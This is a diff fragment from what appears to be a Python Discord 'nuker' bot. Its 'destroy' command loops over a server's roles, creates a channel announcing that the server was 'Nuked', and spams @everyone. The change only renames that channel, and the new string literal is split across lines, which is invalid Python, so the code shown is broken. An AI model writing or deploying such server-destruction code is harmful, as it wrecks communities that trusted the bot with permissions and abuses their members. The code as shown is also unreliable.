@@ -155,7 +155,8 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
+        channel = await guild.create_text_channel("gg ez
+                                                  Dms")
         await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
